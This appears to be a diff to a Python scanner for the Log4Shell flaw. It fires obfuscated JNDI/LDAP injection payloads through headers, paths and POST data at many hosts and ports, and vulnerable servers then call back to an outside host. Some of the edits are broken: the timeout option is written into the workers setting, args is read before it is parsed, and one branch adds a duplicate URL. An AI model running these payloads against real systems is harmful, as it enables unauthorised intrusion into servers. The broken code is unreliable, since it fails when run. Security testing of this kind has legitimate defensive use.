@@ -23,6 +23,7 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 from termcolor import cprint
+from concurrent.futures import as_completed
 from requests_futures.sessions import FuturesSession
 import socket, struct
 import tldextract
@@ -52,7 +53,6 @@ default_headers = {
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
-timeout = 4
 
 protocols = [f"jndi:ldap:",
             f'${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}'
@@ -67,7 +67,9 @@ paths = ['/',
     f'/$%7B$%7Benv:BARFOO:-j%7Dndi$%7Benv:BARFOO:-:%7D$%7Benv:BARFOO:-l%7Ddap$%7Benv:BARFOO:-:%7D//{{callback_host}}/{{random}}%7B'
 ]
 
-typical_ports = ['8080', '8000', '10000', '8443', '7443', '8083', '8008', '81', '300', '591', '593', '832', '981', '1010', '1311', '1099', '2082', '2095', '2096', '2480', '3000', '3128', '3333', '4243', '4567', '4711', '4712', '4993', '5000', '5104', '5108', '5280', '5281', '5800', '6543', '7000', '7396', '7474', '8000', '8001', '8014', '8042', '8069', '8081', '8088', '8090', '8091', '8118', '8123', '8172', '8222', '8243', '8280', '8281', '8333', '8337', '8500', '8834', '8880', '8888', '8983', '9000', '9043', '9060', '9080', '9090', '9091', '9200', '9443', '9800', '9981', '11371', '12443', '16080', '18091', '18092', '20720', '55672', '2087', '28017']
+typical_ports = ['443', '80', '81', '7000', '3333', '9800', '8080', '8000', '10000', '8443', '7443', '8880', '8008', '2087', '8172']
+
+counter = 0
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -134,6 +136,18 @@ parser.add_argument("--all-ports",
                     dest="all_ports",
                     help="Scan The Domains/Sites Typical Ports.",
                     action='store_true')
+parser.add_argument("--workers",
+                    dest="workers",
+                    help="Scan The Domains/Sites Typical Ports.",
+                    action='store',
+                    default=10)
+parser.add_argument("--timeout",
+                    dest="workers",
+                    help="Scan The Domains/Sites Typical Ports.",
+                    action='store',
+                    default=0.2)
+
+timeout = float(args.timeout)
 
 args = parser.parse_args()
 
@@ -151,7 +165,6 @@ def get_fuzzing_headers(payload):
     if args.exclude_user_agent_fuzzing:
         fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
 
-    fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
     return fuzzing_headers
 
 
@@ -270,7 +283,7 @@ def parse_url(url):
             "host":  urlparse.urlparse(url).netloc.split(":")[0],
             "file_path": file_path})
 
-async_session = FuturesSession(max_workers=6)
+async_session = FuturesSession(max_workers=int(args.workers), adapter_kwargs={'max_retries': 0})
 
 def get_ips(start, end):
     '''Return IPs in IPv4 range, inclusive.'''
@@ -279,6 +292,7 @@ def get_ips(start, end):
     return [ipaddress.ip_address(ip).exploded for ip in range(start_int, end_int)]
 
 def scan_url(url, callback_host):
+    global counter
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
@@ -288,31 +302,52 @@ def scan_url(url, callback_host):
     paths = generate_path_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+        headers = get_fuzzing_headers(payload)
         if args.request_type.upper() == "GET" or args.run_all_tests:
-            try:
-                for path in paths:
-                    futures.append(async_session.get(url=url+path,
-                                    headers=get_fuzzing_headers(payload),
-                                    verify=False,
-                                    timeout=timeout))
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+            for path in paths:
+                future = async_session.get(url=url+path,
+                                headers=headers,
+                                verify=False,
+                                timeout=timeout)
+                future.i = counter
+                counter += 1
+                futures.append(future)
 
         if args.request_type.upper() == "POST" or args.run_all_tests:
-            try:
-                for path in paths:
-                    futures.append(async_session.post(url=url+path,
-                                    headers=get_fuzzing_headers(payload),
-                                    verify=False,
-                                    timeout=timeout))
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+            for path in paths:
+                future = async_session.post(url=url+path,
+                                headers=headers,
+                                verify=False,
+                                timeout=timeout)
+                future.i = counter
+                counter += 1
+                futures.append(future)
 
 
 def main():
     urls = []
     if args.url:
-        urls.append(args.url)
+        original_url = args.url.strip().replace('http://', '').replace('https://', '')
+        i = args.url.strip().replace('http://', '').replace('https://', '')
+        port = urlparse.urlparse('http://'+i).port
+        ext = tldextract.extract(i)
+        if ext.subdomain != '':
+            i = f'{ext.subdomain}.{ext.registered_domain}'
+        else:
+            i = f'{ext.registered_domain}'
+            if i == "":
+                i = original_url
+        if args.all_ports:
+            for p in typical_ports:
+                urls.append(f'http://{i}:{p}')
+                urls.append(f'https://{i}:{p}')
+        else:
+            if port:
+                urls.append(f'http://{i}:{port}')
+                urls.append(f'http://{i}:{port}')
+            else:
+                urls.append(f'http://{i}')
+                urls.append(f'https://{i}')
     if args.usedlist:
         with open(args.usedlist, "r") as f:
             for i in f.readlines():
@@ -431,13 +466,15 @@ def main():
 if __name__ == "__main__":
     try:
         main()
-        if args.wait_response:
-            for f in futures:
+        for future in as_completed(futures):
+            if args.wait_response:
                 try:
-                    res = f.result()
-                    cprint(f"[•] URL: {res.url} | RESPONSE: {res.status_code}", "cyan")
-                except Exception as e:
-                    cprint(f"EXCEPTION: {e}", "red")
+                    res = future.result()
+                    cprint(f"[•] URL: {res.request.url} | RESPONSE: {res.url} {res.status_code}", "cyan")
+                except:
+                    pass
+            counter -= 1
+            cprint(f'PENDING REQUESTS: {counter}', 'grey')
     except KeyboardInterrupt:
         print("\nKeyboardInterrupt Detected.")
         print("Exiting...")
